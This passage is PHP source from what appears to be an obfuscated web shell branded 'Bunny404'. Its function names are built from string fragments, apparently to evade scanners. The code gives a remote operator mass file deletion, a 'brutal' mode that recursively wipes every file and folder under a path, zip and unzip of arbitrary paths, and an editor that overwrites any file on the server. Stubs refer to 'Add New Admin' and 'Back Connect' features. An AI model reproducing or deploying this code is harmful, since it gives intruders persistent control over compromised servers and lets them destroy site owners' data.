        $cls_d = 'cl' . 'os' . 'e' . 'd' . 'i' . 'r';
        function mass_delete_file($path, $thisfilename)
        {
            global $f_exist;
            global $is_w;
            global $is_d;
            global $unl;
            global $d_name;
            global $scn_d;
            global $txtYellow;
            global $txtRed;
            global $txtWhite;
            global $txtGreen;
            if ($is_w($path)) {
                $this_dir = $scn_d($path);
                foreach ($this_dir as $dirs) {
                    $delpath = "$path/$dirs";
                    $delfilepath = $delpath . '/' . $thisfilename;
                    if ($dirs === '.') {
                        if ($f_exist("$path/$thisfilename")) {
                            $unl("$path/$thisfilename");
                        }
                    } elseif ($dirs === '..') {
                        if ($f_exist("" . $d_name($path) . "/$thisfilename")) {
                            $unl("" . $d_name($path) . "/$thisfilename");
                        }
                    } else {
                        if ($is_d($delpath)) {
                            if ($is_w($delpath)) {
                                if ($f_exist($delfilepath)) {
                                    echo '<span class="' . $txtWhite . ' ml-4">[<i class="fa-solid fa-check-double ' . $txtGreen . '"></i>]</span>&nbsp;' . $delfilepath . ' (<font class="' . $txtRed . ' font-bold">DELETED!</font>)<br>';
                                    echo '<span class="' . $txtWhite . ' ml-4">[<i class="fa-solid fa-check-double ' . $txtGreen . '"></i>]</span>&nbsp;' . $path . '/' . $thisfilename . ' (<font class="' . $txtRed . ' font-bold">DELETED!</font>)<br>';
                                    $unl($delfilepath);
                                    mass_delete_file($delpath, $thisfilename);
                                }
                            }
                        }
                    }
                }
            } else {
                echo '<span class="' . $txtYellow . '">Sorry... Your Selected Path Not Writetable!</span>';
            }
        }
        function mass_delete_brutal($this_path)
        {
            global $f_exist;
            global $is_w;
            global $is_d;
            global $is_f;
            global $unl;
            global $rm_d;
            global $opn_d;
            global $r_d;
            global $cls_d;
            global $txtYellow;
            global $txtWhite;
            global $txtGreen;
            global $txtRed;
            if ($is_w) {
                if ($brutal = $opn_d($this_path)) {
                    while (false !== ($entry = $r_d($brutal))) {
                        if ($entry != "." && $entry != "..") {
                            if ($is_f($this_path . "/" . $entry)) {
                                $unl($this_path . "/" . $entry);
                                echo '<span class="' . $txtWhite . ' ml-4">[<i class="fa-solid fa-check-double ' . $txtGreen . '"></i>]</span>&nbsp;' . $this_path . '/' . $entry . ' (<font class="' . $txtRed . ' font-bold">DELETED!</font>)<br>';
                            } elseif ($is_d($this_path . "/" . $entry)) {
                                echo '<span class="' . $txtWhite . ' ml-4">[<i class="fa-solid fa-check-double ' . $txtGreen . '"></i>]</span>&nbsp;' . $this_path . '/' . $entry . ' (<font class="' . $txtRed . ' font-bold">DELETED!</font>)<br>';
                                $rm_d($this_path . "/" . $entry);
                                mass_delete_brutal($this_path . "/" . $entry);
                            }
                        }
                    }
                    $cls_d($brutal);
                }
            } else {
                echo '<span class="' . $txtYellow . '">Sorry... This Path Not Writetable!</span>';
            }
        }

        if (isset($_POST['btn-massdelfile'])) {
            $thispath = $_POST['massdelpath'];
            $thisfile = $_POST['massdelfile'];
            mass_delete_file($thispath, $thisfile);
        }

        if (isset($_POST['btn-massdelbrutal'])) {
            $thispath = $_POST['massdelpath'];
            mass_delete_brutal($thispath);
        }

        echo '
        <form method="POST" action="" class="max-w-sm ml-4 mt-6">
            <label for="option" class="block mb-2 text-sm font-medium ' . $txtBlue . '">Change Option</label>
            <select id="option" name="option" onchange="this.form.submit()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                <option>Select Option</option>
                <option value="deletefile">MASS DELETE FILE</option>
                <option value="deletebrutal">MASS DELETE BRUTAL</option>
            </select>
        </form>';
        if ($_SERVER["REQUEST_METHOD"] === "POST") {
            $option = $_POST['option'];
            $deletefile = 'deletefile';
            $deletebrutal = 'deletebrutal';
            if ($option === $deletefile) {
                echo '<form class="ml-4 my-2" action="" method="POST">';
                echo '<span class="block ' . $txtYellow . ' font-medium">' . strtoupper($option) . '<font class="' . $txtBlue . '">&nbsp;&nbsp;Option Selected!</font></span>';
                echo '<label class="block">
                        <span class="block ' . $txtBlue . ' font-medium">Path <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                        <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="' . $path . '" name="massdelpath">
                    </label>';
                echo '<label class="block">
                        <span class="block ' . $txtBlue . ' font-medium">Filename <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                        <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="index.php" name="massdelfile">
                    </label>';
                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
                echo '<button type="submit" name="btn-massdelfile" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Delete</button>';
                echo '</form>';
            } elseif ($option === $deletebrutal) {
                echo '<form class="ml-4 my-2" action="" method="POST">';
                echo '<span class="block ' . $txtRed . ' font-medium">' . strtoupper($option) . '<font class="' . $txtBlue . '">&nbsp;&nbsp;Option Selected!</font></span>';
                echo '<label class="block">
                        <span class="block ' . $txtBlue . ' font-medium">Path <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                        <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="' . $path . '" name="massdelpath">
                    </label>';
                echo '<label class="block">
                        <span class="block ' . $txtBlue . ' font-medium">Filename <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                        <span class="block ' . $txtBlue . '"><font class="' . $txtRed . '">Delete Brutal</font> is <font class="' . $txtYellow . '">Dangerous</font> because it can <font class="' . $txtRed . '">delete all</font> files and all folder in the target path</span>
                    </label>';
                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
                echo '<button type="submit" name="btn-massdelbrutal" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Delete</button>';
                echo '</form>';
            } else {
                echo '<span style="display: none;">Bunny404 WAs Here</span>';
            }
        }
    }

    if (isset($_GET['ziper'])) {
        $ext_load = 'extension_loaded';
        $f_exist = 'fi' . 'le_' . 'ex' . 'is' . 'ts';
        $rilpath = 're' . 'a' . 'lp' . 'a' . 'th';
        $is_f = 'is' . '_' . 'f' . 'il' . 'e';
        $is_d = 'is' . '_' . 'd' . 'i' . 'r';
        function BunnyZip($this_path, $saveas)
        {
            global $ext_load;
            global $f_exist;
            global $rilpath;
            global $is_f;
            global $is_d;
            if (!$ext_load('zip') || !$f_exist($this_path)) {
                return false;
            }

            $zip = new ZipArchive();
            if (!$zip->open($saveas, ZIPARCHIVE::CREATE)) {
                return false;
            }

            $this_path = rtrim($this_path, '/\\');
            $baseName = basename($this_path);

            if ($is_d($this_path) === true) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this_path), RecursiveIteratorIterator::SELF_FIRST);

                foreach ($files as $file) {
                    $file = $rilpath($file);
                    $fileToAdd = substr($file, strlen($this_path) + 1);

                    if ($is_d($file) === true) {
                        $zip->addEmptyDir($fileToAdd);
                    } elseif ($is_f($file) === true) {
                        $zip->addFile($file, $fileToAdd);
                    }
                }
            } elseif ($is_f($this_path) === true) {
                $zip->addFile($this_path, $baseName);
            }
            return $zip->close();
        }

        function BunnyUnzip($zippath, $extractto)
        {
            global $ext_load;
            global $f_exist;
            if (!$ext_load('zip') || !$f_exist($zippath)) {
                return false;
            }

            $zip = new ZipArchive;
            if ($zip->open($zippath) === TRUE) {
                $zip->extractTo($extractto);
                return $zip->close();
            }
        }

        if (isset($_POST['btn-zip'])) {
            $this_path = $_POST['zippath'];
            $saveas = $_POST['zipsavename'];
            $ngezip = BunnyZip($this_path, $saveas);
            if ($ngezip) {
                echo '<script>alert("Folder has been successfully compressed to zip")</script>';
            } else {
                echo '<script>alert("Failed to compress this folder")</script>';
            }
        }

        if (isset($_POST['btn-unzip'])) {
            $zippath = $_POST['unzippath'];
            $extractto = $_POST['unziptopath'];
            $ngunzip = BunnyUnzip($zippath, $extractto);
            if ($ngunzip) {
                echo '<script>alert("The folder has been successfully extracted")</script>';
            } else {
                echo '<script>alert("Failed to extract this folder")</script>';
            }
        }
        echo '
        <form method="POST" action="" class="max-w-sm ml-4 mt-6">
            <label for="option" class="block mb-2 text-sm font-medium ' . $txtBlue . '">Change Option</label>
            <select id="option" name="option" onchange="this.form.submit()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                <option>Select Option</option>
                <option value="zip">ZIP</option>
                <option value="unzip">UNZIP</option>
            </select>
        </form>';
        if ($_SERVER["REQUEST_METHOD"] === "POST") {
            $option = $_POST['option'];
            $zip = 'zip';
            $unzip = 'unzip';

            if ($option === $zip) {
                echo '<form class="ml-4 my-2" action="" method="POST">';
                echo '<span class="block ' . $txtOrange . ' font-medium">' . strtoupper($option) . '<font class="' . $txtBlue . '">&nbsp;&nbsp;Option Selected!</font></span>';
                echo '<label class="block">
                    <span class="block ' . $txtBlue . ' font-medium">Path To Zip <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                    <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="' . $path . '" name="zippath">
                </label>';
                echo '<label class="block">
                    <span class="block ' . $txtBlue . ' font-medium">Save As <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                    <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="' . $path . '.zip" name="zipsavename">
                </label>';
                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
                echo '<button type="submit" name="btn-zip" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Zip</button>';
                echo '</form>';
            } elseif ($option === $unzip) {
                echo '<form class="ml-4 my-2" action="" method="POST">';
                echo '<span class="block ' . $txtOrange . ' font-medium">' . strtoupper($option) . '<font class="' . $txtBlue . '">&nbsp;&nbsp;Option Selected!</font></span>';
                echo '<label class="block">
                    <span class="block ' . $txtBlue . ' font-medium">Zip Path <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                    <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="' . $path . '.zip" name="unzippath">
                </label>';
                echo '<label class="block">
                    <span class="block ' . $txtBlue . ' font-medium">Extract To <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                    <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="' . $path . '" name="unziptopath">
                </label>';
                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
                echo '<button type="submit" name="btn-unzip" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Unzip</button>';
                echo '</form>';
            }
        }
    }

    if (isset($_GET['addNewAdmin'])) {
        echo '<span class="mx-4 mb-4 mt-4 ubuntu-mono ' . $txtYellow . '">Sorry... The Feature <font class="' . $txtWhite . '">Add New Admin</font> Is Maintance!</span>';
    }
    if (isset($_GET['backConnect'])) {
        echo '<span class="mx-4 mb-4 mt-4 ubuntu-mono ' . $txtYellow . '">Sorry... The Feature <font class="' . $txtWhite . '">Back Connect</font> Is Maintance!</span>';
    }

    if (isset($_GET['editfile'])) {
        $SiBunny = 'h' . 'tm' . 'ls' . 'pe' . 'cial' . 'ch' . 'ars';
        $b_name = 'b' . 'as' . 'en' . 'am' . 'e';
        $f_get = 'f' . 'il' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'co' . 'nten' . 't' . 's';
        $fo = "fop" . "en";
        $fw = "fw" . "r" . "it" . "e";
        $fc = 'fc' . 'lo' . 's' . 'e';
        if (isset($_POST['btn-editedfile'])) {
            $fo = "fop" . "en";
            $fw = "fw" . "r" . "it" . "e";
            $fp = $fo($_GET['editfile'], 'w');
            if ($fw($fp, ($_POST['filecontent']))) {
                echo '
            <script>
                alert("Edit File Success");
                history.back()
                history.back()
            </script>';
            } else {
                echo '
            <script>
                alert("Edit File Failed!")
                history.back()
            </script>
            ';
            }
            $fc($fp);
        }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo "<font class='" . $txtSky . "'>EDIT FILE => " . $path . '/' . $b_name($_GET['editfile']) . "</font>";
        $content = $SiBunny($f_get($_GET['editfile']));
        echo '
        <style type="text/css">
        @import url("https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap");

        #divCodeWrapper {
            height: 80vh;
            width: 100%;
            overflow: hidden;
            border: 1px solid #a5a5a5;
            position: relative;
        }

        #preCode {
            height: 100%;
            width: 100%;
            position: absolute;
            top: 0;
            left: 0;
            overflow: hidden;
            padding: 0;
            margin: 0;
            background: #1b1b1b;
        }

            #preCode code {
                padding: 15px;
                height: calc(100% - 30px);
                width: calc(100% - 30px);
                font-family: "Roboto Mono", monospace;
                font-weight: 400;
                font-size: 12pt;
                line-height: 150%;
                overflow-y: scroll;
                overflow-x: auto;
            }

        textarea {
            font-family: "Roboto Mono", monospace;
            font-weight: 400;
            font-size: 12pt;
            line-height: 150%;
            position: absolute;
            top: 0;
            left: 0;
            height: calc(100% - 30px);
            width: calc(100% - 30px);
            padding: 15px;
            z-index: 2;
            overflow-x: auto;
            overflow-y: scroll;
            white-space: nowrap;
            background-color: rgba(0,0,0,0);
            color: rgba(0,0,0,0);
            caret-color: white;
        }
    </style>
        <br><span>Theme:</span>
        <select id="selectStyle" class="bg-black">
            <option>a11y-dark.min.css</option>
            <option>a11y-light.min.css</option>
            <option>agate.min.css</option>
            <option>an-old-hope.min.css</option>
            <option>androidstudio.min.css</option>
            <option>arduino-light.min.css</option>
            <option>arta.min.css</option>
            <option>ascetic.min.css</option>
            <option>atom-one-dark-reasonable.min.css</option>
            <option>atom-one-dark.min.css</option>
            <option>atom-one-light.min.css</option>
            <option>brown-paper.min.css</option>
            <option>codepen-embed.min.css</option>
            <option>color-brewer.min.css</option>
            <option>dark.min.css</option>
            <option>default.min.css</option>
            <option>devibeans.min.css</option>
            <option>docco.min.css</option>
            <option>far.min.css</option>
            <option>felipec.min.css</option>
            <option>foundation.min.css</option>
            <option>github-dark-dimmed.min.css</option>
            <option>github-dark.min.css</option>
            <option>github.min.css</option>
            <option>gml.min.css</option>
            <option>googlecode.min.css</option>
            <option>gradient-dark.min.css</option>
            <option>gradient-light.min.css</option>
            <option>grayscale.min.css</option>
            <option>hybrid.min.css</option>
            <option>idea.min.css</option>
            <option>intellij-light.min.css</option>
            <option>ir-black.min.css</option>
            <option>isbl-editor-dark.min.css</option>
            <option>isbl-editor-light.min.css</option>
            <option>kimbie-dark.min.css</option>
            <option>kimbie-light.min.css</option>
            <option>lightfair.min.css</option>
            <option>lioshi.min.css</option>
            <option>magula.min.css</option>
            <option>mono-blue.min.css</option>
            <option>monokai-sublime.min.css</option>
            <option>monokai.min.css</option>
            <option>night-owl.min.css</option>
            <option>nnfx-dark.min.css</option>
            <option>nnfx-light.min.css</option>
            <option>nord.min.css</option>
            <option>obsidian.min.css</option>
            <option>panda-syntax-dark.min.css</option>
            <option>panda-syntax-light.min.css</option>
            <option>paraiso-dark.min.css</option>
            <option>paraiso-light.min.css</option>
            <option>pojoaque.min.css</option>
            <option>purebasic.min.css</option>
            <option>qtcreator-dark.min.css</option>
            <option>qtcreator-light.min.css</option>
            <option>rainbow.min.css</option>
            <option>routeros.min.css</option>
            <option>school-book.min.css</option>
            <option>shades-of-purple.min.css</option>
            <option>srcery.min.css</option>
            <option>stackoverflow-dark.min.css</option>
            <option>stackoverflow-light.min.css</option>
            <option>sunburst.min.css</option>
            <option>tokyo-night-dark.min.css</option>
            <option>tokyo-night-light.min.css</option>
            <option>tomorrow-night-blue.min.css</option>
            <option>tomorrow-night-bright.min.css</option>
            <option>vs.min.css</option>
            <option selected>vs2015.min.css</option>
            <option>xcode.min.css</option>
            <option>xt256.min.css</option>
            <option>base16/3024.min.css</option>
            <option>base16/apathy.min.css</option>
            <option>base16/apprentice.min.css</option>
            <option>base16/ashes.min.css</option>
            <option>base16/atelier-cave-light.min.css</option>
            <option>base16/atelier-cave.min.css</option>
            <option>base16/atelier-dune-light.min.css</option>
            <option>base16/atelier-dune.min.css</option>
            <option>base16/atelier-estuary-light.min.css</option>
            <option>base16/atelier-estuary.min.css</option>
            <option>base16/atelier-forest-light.min.css</option>
            <option>base16/atelier-forest.min.css</option>
            <option>base16/atelier-heath-light.min.css</option>
            <option>base16/atelier-heath.min.css</option>
            <option>base16/atelier-lakeside-light.min.css</option>
            <option>base16/atelier-lakeside.min.css</option>
            <option>base16/atelier-plateau-light.min.css</option>
            <option>base16/atelier-plateau.min.css</option>
            <option>base16/atelier-savanna-light.min.css</option>
            <option>base16/atelier-savanna.min.css</option>
            <option>base16/atelier-seaside-light.min.css</option>
            <option>base16/atelier-seaside.min.css</option>
            <option>base16/atelier-sulphurpool-light.min.css</option>
            <option>base16/atelier-sulphurpool.min.css</option>
            <option>base16/atlas.min.css</option>
            <option>base16/bespin.min.css</option>
            <option>base16/black-metal-bathory.min.css</option>
            <option>base16/black-metal-burzum.min.css</option>
            <option>base16/black-metal-dark-funeral.min.css</option>
            <option>base16/black-metal-gorgoroth.min.css</option>
            <option>base16/black-metal-immortal.min.css</option>
            <option>base16/black-metal-khold.min.css</option>
            <option>base16/black-metal-marduk.min.css</option>
            <option>base16/black-metal-mayhem.min.css</option>
            <option>base16/black-metal-nile.min.css</option>
            <option>base16/black-metal-venom.min.css</option>
            <option>base16/black-metal.min.css</option>
            <option>base16/brewer.min.css</option>
            <option>base16/bright.min.css</option>
            <option>base16/brogrammer.min.css</option>
            <option>base16/brush-trees-dark.min.css</option>
            <option>base16/brush-trees.min.css</option>
            <option>base16/chalk.min.css</option>
            <option>base16/circus.min.css</option>
            <option>base16/classic-dark.min.css</option>
            <option>base16/classic-light.min.css</option>
            <option>base16/codeschool.min.css</option>
            <option>base16/colors.min.css</option>
            <option>base16/cupcake.min.css</option>
            <option>base16/cupertino.min.css</option>
            <option>base16/danqing.min.css</option>
            <option>base16/darcula.min.css</option>
            <option>base16/dark-violet.min.css</option>
            <option>base16/darkmoss.min.css</option>
            <option>base16/darktooth.min.css</option>
            <option>base16/decaf.min.css</option>
            <option>base16/default-dark.min.css</option>
            <option>base16/default-light.min.css</option>
            <option>base16/dirtysea.min.css</option>
            <option>base16/dracula.min.css</option>
            <option>base16/edge-dark.min.css</option>
            <option>base16/edge-light.min.css</option>
            <option>base16/eighties.min.css</option>
            <option>base16/embers.min.css</option>
            <option>base16/equilibrium-dark.min.css</option>
            <option>base16/equilibrium-gray-dark.min.css</option>
            <option>base16/equilibrium-gray-light.min.css</option>
            <option>base16/equilibrium-light.min.css</option>
            <option>base16/espresso.min.css</option>
            <option>base16/eva-dim.min.css</option>
            <option>base16/eva.min.css</option>
            <option>base16/flat.min.css</option>
            <option>base16/framer.min.css</option>
            <option>base16/fruit-soda.min.css</option>
            <option>base16/gigavolt.min.css</option>
            <option>base16/github.min.css</option>
            <option>base16/google-dark.min.css</option>
            <option>base16/google-light.min.css</option>
            <option>base16/grayscale-dark.min.css</option>
            <option>base16/grayscale-light.min.css</option>
            <option>base16/green-screen.min.css</option>
            <option>base16/gruvbox-dark-hard.min.css</option>
            <option>base16/gruvbox-dark-medium.min.css</option>
            <option>base16/gruvbox-dark-pale.min.css</option>
            <option>base16/gruvbox-dark-soft.min.css</option>
            <option>base16/gruvbox-light-hard.min.css</option>
            <option>base16/gruvbox-light-medium.min.css</option>
            <option>base16/gruvbox-light-soft.min.css</option>
            <option>base16/hardcore.min.css</option>
            <option>base16/harmonic16-dark.min.css</option>
            <option>base16/harmonic16-light.min.css</option>
            <option>base16/heetch-dark.min.css</option>
            <option>base16/heetch-light.min.css</option>
            <option>base16/helios.min.css</option>
            <option>base16/hopscotch.min.css</option>
            <option>base16/horizon-dark.min.css</option>
            <option>base16/horizon-light.min.css</option>
            <option>base16/humanoid-dark.min.css</option>
            <option>base16/humanoid-light.min.css</option>
            <option>base16/ia-dark.min.css</option>
            <option>base16/ia-light.min.css</option>
            <option>base16/icy-dark.min.css</option>
            <option>base16/ir-black.min.css</option>
            <option>base16/isotope.min.css</option>
            <option>base16/kimber.min.css</option>
            <option>base16/london-tube.min.css</option>
            <option>base16/macintosh.min.css</option>
            <option>base16/marrakesh.min.css</option>
            <option>base16/materia.min.css</option>
            <option>base16/material-darker.min.css</option>
            <option>base16/material-lighter.min.css</option>
            <option>base16/material-palenight.min.css</option>
            <option>base16/material-vivid.min.css</option>
            <option>base16/material.min.css</option>
            <option>base16/mellow-purple.min.css</option>
            <option>base16/mexico-light.min.css</option>
            <option>base16/mocha.min.css</option>
            <option>base16/monokai.min.css</option>
            <option>base16/nebula.min.css</option>
            <option>base16/nord.min.css</option>
            <option>base16/nova.min.css</option>
            <option>base16/ocean.min.css</option>
            <option>base16/oceanicnext.min.css</option>
            <option>base16/one-light.min.css</option>
            <option>base16/onedark.min.css</option>
            <option>base16/outrun-dark.min.css</option>
            <option>base16/papercolor-dark.min.css</option>
            <option>base16/papercolor-light.min.css</option>
            <option>base16/paraiso.min.css</option>
            <option>base16/pasque.min.css</option>
            <option>base16/phd.min.css</option>
            <option>base16/pico.min.css</option>
            <option>base16/pop.min.css</option>
            <option>base16/porple.min.css</option>
            <option>base16/qualia.min.css</option>
            <option>base16/railscasts.min.css</option>
            <option>base16/rebecca.min.css</option>
            <option>base16/ros-pine-dawn.min.css</option>
            <option>base16/ros-pine-moon.min.css</option>
            <option>base16/ros-pine.min.css</option>
            <option>base16/sagelight.min.css</option>
            <option>base16/sandcastle.min.css</option>
            <option>base16/seti-ui.min.css</option>
            <option>base16/shapeshifter.min.css</option>
            <option>base16/silk-dark.min.css</option>
            <option>base16/silk-light.min.css</option>
            <option>base16/snazzy.min.css</option>
            <option>base16/solar-flare-light.min.css</option>
            <option>base16/solar-flare.min.css</option>
            <option>base16/solarized-dark.min.css</option>
            <option>base16/solarized-light.min.css</option>
            <option>base16/spacemacs.min.css</option>
            <option>base16/summercamp.min.css</option>
            <option>base16/summerfruit-dark.min.css</option>
            <option>base16/summerfruit-light.min.css</option>
            <option>base16/synth-midnight-terminal-dark.min.css</option>
            <option>base16/synth-midnight-terminal-light.min.css</option>
            <option>base16/tango.min.css</option>
            <option>base16/tender.min.css</option>
            <option>base16/tomorrow-night.min.css</option>
            <option>base16/tomorrow.min.css</option>
            <option>base16/twilight.min.css</option>
            <option>base16/unikitty-dark.min.css</option>
            <option>base16/unikitty-light.min.css</option>
            <option>base16/vulcan.min.css</option>
            <option>base16/windows-10-light.min.css</option>
            <option>base16/windows-10.min.css</option>
            <option>base16/windows-95-light.min.css</option>
            <option>base16/windows-95.min.css</option>
            <option>base16/windows-high-contrast-light.min.css</option>
            <option>base16/windows-high-contrast.min.css</option>
            <option>base16/windows-nt-light.min.css</option>
            <option>base16/windows-nt.min.css</option>
            <option>base16/woodland.min.css</option>
            <option>base16/xcode-dusk.min.css</option>
            <option>base16/zenburn.min.css</option>
        </select><br><br>
        <span>Font:</span>
        <select id="selectFont" class="bg-black">
            <option>Roboto Mono</option>
            <option>Consolas</option>
            <option>Cascadia Mono</option>
            <option>Inconsolata</option>
            <option>Source Code Pro</option>
            <option>IBM Plex Mono</option>
            <option>Space Mono</option>
            <option>PT Mono</option>
            <option>Ubuntu Mono</option>
            <option>Nanum Gothic Coding</option>
            <option>Cousine</option>
            <option>Fira Mono</option>
            <option>Share Tech Mono</option>
            <option>Courier Prime</option>
            <option>Anonymous Pro</option>
            <option>Cutive Mono</option>
            <option>VT323</option>
            <option>JetBrains Mono</option>
            <option>Noto Sans Mono</option>
            <option>Red Hat Mono</option>
            <option>Martian Mono</option>
            <option>Major Mono Display</option>
            <option>Nova Mono</option>
            <option>Syne Mono</option>
            <option>Xanh Mono</option>
            <option>Monofett</option>
        </select><br><br>
        <span>Font Size (pt):</span>
        <input id="inputFontSize" class="bg-black" type="number" step=".1" value="8" style="width: 70px;" /><br><br>
        <span>Language:</span>
        <select id="selectLanguage" class="bg-black">
            <option value="language-html">HTML</option>
            <option value="language-javascript">JavaScript</option>
            <option value="language-python">Python</option>
            <option value="language-java">Java</option>
            <option value="language-csharp">C#</option>
            <option value="language-php">PHP</option>
            <option value="language-cpp">C++</option>
            <option value="language-typescript">TypeScript</option>
            <option value="language-ruby">Ruby</option>
        </select><br><br>
        <div id="divCodeWrapper">
            <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
            <textarea name="filecontent" id="textarea1" wrap="soft" spellcheck="false">' . $content . '</textarea>
        </div>
        <script type="text/javascript">
        const textarea1 = document.getElementById("textarea1");
        const codeBlock = document.getElementById("codeBlock");
        let content = textarea1.value;
        content = content.replace(/&/g, "&amp;");
        content = content.replace(/</g, "&lt;");
        content = content.replace(/>/g, "&gt;");
        codeBlock.innerHTML = content;
        highlightJS();

        function updateCode() {
            let content = textarea1.value;
            content = content.replace(/&/g, "&amp;");
            content = content.replace(/</g, "&lt;");
            content = content.replace(/>/g, "&gt;");
            codeBlock.innerHTML = content;
            highlightJS();
        }

        function highlightJS() {
            document.querySelectorAll("pre code").forEach((el) => {
                hljs.highlightElement(el);
            });
        }

        textarea1.addEventListener("input", () => {
            updateCode();
        });

        textarea1.addEventListener("scroll", () => {
            codeBlock.scrollTop = textarea1.scrollTop;
            codeBlock.scrollLeft = textarea1.scrollLeft;
        });

        textarea1.addEventListener("keydown", function (e) {
            if (e.key === "Enter") {
                e.preventDefault();
                var cursorPos = textarea1.selectionStart;
                var prevLine = textarea1.value.substring(0, cursorPos).split("\n").slice(-1)[0];
                var indent = prevLine.match(/^\s*/)[0];
                textarea1.setRangeText("\n" + indent, cursorPos, cursorPos, "end");
                textarea1.blur();
                textarea1.focus();
                updateCode();
                return;
            }
            if (e.key === "Tab" && !e.shiftKey &&
                textarea1.selectionStart == textarea1.selectionEnd) {
                e.preventDefault();
                let cursorPosition = textarea1.selectionStart;
                let newValue = textarea1.value.substring(0, cursorPosition) + "    " +
                    textarea1.value.substring(cursorPosition);
                textarea1.value = newValue;
                textarea1.selectionStart = cursorPosition + 4;
                textarea1.selectionEnd = cursorPosition + 4;    
                updateCode();
                return;
            }

            if (e.key === "Tab" && e.shiftKey &&

                textarea1.selectionStart == textarea1.selectionEnd) {

                e.preventDefault();

                let cursorPosition = textarea1.selectionStart;
                let leadingSpaces = 0;
                for (let i = 0; i < 4; i++) {
                    if (textarea1.value[cursorPosition - i - 1] === " ") {
                        leadingSpaces++;
                    } else {
                        break;
                    }
                }

                if (leadingSpaces > 0) {
                    let newValue = textarea1.value.substring(0, cursorPosition - leadingSpaces) +
                        textarea1.value.substring(cursorPosition);
                    textarea1.value = newValue;
                    textarea1.selectionStart = cursorPosition - leadingSpaces;
                    textarea1.selectionEnd = cursorPosition - leadingSpaces;
                }

                updateCode();
                return;
            }

            if (e.key == "Tab" & textarea1.selectionStart != textarea1.selectionEnd) {
                e.preventDefault();
                let lines = this.value.split("\n");

                let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
                let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;

                let spacesRemovedFirstLine = 0;
                let spacesRemoved = 0;

                if (e.shiftKey) {
                    for (let i = startPos; i <= endPos; i++) {
                        lines[i] = lines[i].replace(/^ {1,4}/, function (match) {
                            if (i == startPos)
                                spacesRemovedFirstLine = match.length;
                            spacesRemoved += match.length;

                            return "";
                        });
                    }
                } else {
                    for (let i = startPos; i <= endPos; i++) {
                        lines[i] = "    " + lines[i];
                    }
                }
                let start = this.selectionStart;
                let end = this.selectionEnd;
                this.value = lines.join("\n");
                this.selectionStart = e.shiftKey ?
                    start - spacesRemovedFirstLine : start + 4;
                this.selectionEnd = e.shiftKey ?
                    end - spacesRemoved : end + 4 * (endPos - startPos + 1); 
                updateCode();
